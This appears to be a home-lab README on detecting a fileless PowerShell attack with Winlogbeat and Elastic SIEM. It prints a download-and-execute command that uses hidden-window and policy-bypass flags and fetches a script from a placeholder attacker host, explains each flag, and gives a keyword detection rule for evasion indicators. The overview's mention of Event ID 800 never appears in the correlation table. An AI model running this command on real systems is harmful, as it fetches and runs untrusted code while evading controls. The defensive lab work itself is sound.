# PowerShell Fileless Attack Detection Lab (Elastic SIEM)

## 📌 Overview

This lab simulates a fileless PowerShell attack (download-and-execute via `IEX` + `WebClient.DownloadString`) and demonstrates end-to-end detection using Winlogbeat + Elastic SIEM (Kibana Detection Rules), correlated with native Windows PowerShell logging (Event IDs 4103 & 800).

## 🏗️ Lab Architecture

| Component     | Role                    | Notes                                                 |
| ------------- | ----------------------- | ----------------------------------------------------- |
| Kali Linux    | Attacker / payload host | Serves `malware.ps1` over HTTP                        |
| Windows 11 VM | Victim endpoint         | Runs Winlogbeat, executes the attack command          |
| Ubuntu VM     | SIEM backend            | Runs Elasticsearch + Kibana, hosts the detection rule |

```
[Kali - HTTP Server]  --serves malware.ps1-->  [Windows 11 - Victim]
                                                     |
                                                Winlogbeat (forwards logs)
                                                     |
                                                     v
                                        [Ubuntu - Elasticsearch/Kibana]
                                                     |
                                             Detection Rule -> Alert
```

## ⚙️ Setup Summary

1. Install and configure **Winlogbeat** on Windows 11, pointing to the Elasticsearch instance on the Ubuntu VM (TLS enabled).
2. Enable **PowerShell Script Block Logging** (Group Policy or registry) so Event ID **4104** is generated.
3. Enable **Module Logging** for Event ID **4103**.
4. Confirm classic `Windows PowerShell.evtx` log is active for Event ID **800**.
5. On Kali, host `malware.ps1` via a simple HTTP server (e.g. `python3 -m http.server 80`).
6. Create the detection rule in Kibana (see below).

## 🛡️ Detection Rule

**Index pattern:** `winlogbeat-*`
**Severity:** High | **Risk score:** 75

```
event.code:"4104" and powershell.file.script_block_text:(
  "*IEX*" or "*Invoke-Expression*" or "*DownloadString*" or
  "*WebClient*" or "*Invoke-WebRequest*" or "*http://*" or "*https://*" or
  "*FromBase64String*" or "*EncodedCommand*" or "*Start-Process*" or
  "*Add-MpPreference*" or "*-w hidden*" or "*-ep bypass*" or
  "*AMSI*" or "*Reflection.Assembly*"
)
```

This rule targets common fileless-malware / Living-off-the-Land indicators seen in PowerShell script block content.

## 💣 Attack Simulation

Executed from Windows 11 (`cmd`/`powershell`):

```powershell
powershell -w hidden -ep bypass -nop -c IEX ((New-Object System.Net.Webclient).DownloadString('http://<kali-ip>/malware.ps1'))
```

| Flag                            | Purpose                                                         |
| ------------------------------- | --------------------------------------------------------------- |
| `-w hidden`                     | Hides the PowerShell window                                     |
| `-ep bypass`                    | Bypasses execution policy restrictions                          |
| `-nop`                          | Skips loading the PowerShell profile                            |
| `IEX (...).DownloadString(...)` | Downloads and executes code in memory (no file written to disk) |

> Note: Even when the downloaded script errors at runtime, Script Block Logging still captures the code content, so the alert fires regardless of execution success.

## 🔍 Detection Evidence

- Alert triggered in Kibana under **Detection rules (SIEM) → Alerts**.
- Key fields reviewed in the alert:
  - `powershell.file.script_block_text` — full captured code
  - `host.name` — affected endpoint
  - `user.name` — executing user
  - `@timestamp` — time of execution

## 🧾 Correlating Native Windows Logs

| Event ID | Log                                      | What it captures                                                            |
| -------- | ---------------------------------------- | --------------------------------------------------------------------------- |
| **4104** | Microsoft-Windows-PowerShell/Operational | Full script block content (Script Block Logging)                            |
| **4103** | Microsoft-Windows-PowerShell/Operational | Module logging: pipeline execution details, cmdlets & parameter values used |

## 📚 Lessons Learned

- Fileless attacks can be reliably detected via PowerShell logging even without endpoint AV signatures.
- Layering 4104 + 4103 gives redundancy in case one logging source is disabled or tampered with.
- Detection rules based on behavioral indicators (flags, cmdlets, URLs) generalize better than static IOCs.

---

_This lab is for educational/home-lab purposes in an isolated environment only._
